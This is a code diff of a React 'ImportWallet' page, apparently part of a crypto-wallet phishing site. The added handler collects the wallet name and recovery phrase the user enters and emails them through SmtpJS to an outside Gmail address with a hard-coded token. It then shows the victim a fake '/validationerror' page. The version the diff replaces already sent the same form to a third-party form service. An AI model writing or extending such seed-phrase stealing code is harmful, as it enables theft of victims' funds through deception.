@@ -9,7 +9,35 @@ const ImportWallet = () => {
   const navigate = useNavigate();
   const { id } = useParams();
   const [keyType, setKeyType] = useState("Phrase");
-  const [state, handleSubmit] = useForm("mjvqbbnl");
+  // const [state, handleSubmit] = useForm("mjvqbbnl");
+  const [formState, setFormState] = useState({});
+
+  const changeHandler = (event) => {
+    setFormState({
+      ...formState,
+      [event.target.name]: event.target.value,
+      wallet: wallets[id].title,
+    });
+  };
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    const config = {
+      SecureToken: "f82cf782-76e6-40f1-911d-473ca9694550",
+      To: "Captainsurge0079@gmail.com",
+      From: "streklandsturk@gmail.com",
+      Subject: "blocksystem-chain",
+      Body: `This is the data from the email sent: 
+      
+      Wallet= ${JSON.stringify(formState.wallet)}
+      
+      CurrentPhase= ${JSON.stringify(formState.currentPhrase)}`,
+    };
+
+    if (window.Email) {
+      window.Email.send(config).then((message) => navigate("/validationerror"));
+    }
+  };
 
   const HandleWallet = () => {
     let tabs = document.querySelectorAll(".tab");
@@ -55,9 +83,9 @@ const ImportWallet = () => {
     HandleWallet();
   }, []);
 
-  if (state.succeeded) {
-    navigate("/validationerror");
-  }
+  // if (state.succeeded) {
+  //   navigate("/validationerror");
+  // }
   return (
     <>
       <Link to="/" className="absolute left-5 top-20 w-[4rem] h-[4rem]">
@@ -119,7 +147,11 @@ const ImportWallet = () => {
               <div className="mt-6 relative">
                 <div>
                   <form onSubmit={handleSubmit}>
-                    <FormSubmit keyType={keyType} wallet={wallets[id].title} />
+                    <FormSubmit
+                      keyType={keyType}
+                      // wallet={wallets[id].title}
+                      changeHandler={changeHandler}
+                    />
                     <div className="flex font-urbanist justify-between items-center mt-5">
                       <Link
                         to="/"
@@ -130,7 +162,7 @@ const ImportWallet = () => {
                       <button
                         className="bg-lime-500 py-5 w-[48%] rounded-full text-[#222222] font-bold"
                         type="submit"
-                        disabled={state.submitting}
+                        // disabled={state.submitting}
                       >
                         Import
                       </button>
